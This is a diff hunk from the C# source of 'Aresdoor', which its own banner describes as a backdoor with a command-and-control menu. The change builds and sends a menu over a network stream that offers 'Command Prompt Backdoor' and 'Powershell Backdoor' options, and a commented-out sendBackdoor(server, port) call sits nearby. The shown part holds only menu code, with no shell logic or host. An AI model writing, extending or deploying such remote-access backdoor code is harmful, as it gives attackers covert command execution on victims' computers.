@@ -223,15 +223,18 @@ namespace aresdoor
                         while (true)
                         {
                             string aresdoorStartMenu = string.Empty;
-                            aresdoorStartMenu += "";
-
-                            /*
-+-------------------------------------------------------------+
-| Welcome to Aresdoor - a backdoor written by @BlackVikingPro |
-| Current Version: v1.2.1
-                            */
-
-                            nc.dataTravelTO(stream, "Testing...");
+                            aresdoorStartMenu += "+-------------------------------------------------------------+\n";
+                            aresdoorStartMenu += "| Welcome to Aresdoor - a backdoor written by @BlackVikingPro |\n";
+                            aresdoorStartMenu += "| Current Version: v1.2.1                                     |\n";
+                            aresdoorStartMenu += "|                                                             |\n";
+                            aresdoorStartMenu += "| C&C Menu Version: v1.0                                      |\n";
+                            aresdoorStartMenu += "+-------------------------------------------------------------+\n";
+                            aresdoorStartMenu += "Please select an option below:\n";
+                            aresdoorStartMenu += " 1) Command Prompt Backdoor\n";
+                            aresdoorStartMenu += " 2) Powershell Backdoor\n";
+                            aresdoorStartMenu += " 3) Exit\n";
+                            
+                            nc.dataTravelTO(stream, aresdoorStartMenu);
                         }
 
                         // sendBackdoor(server, port);
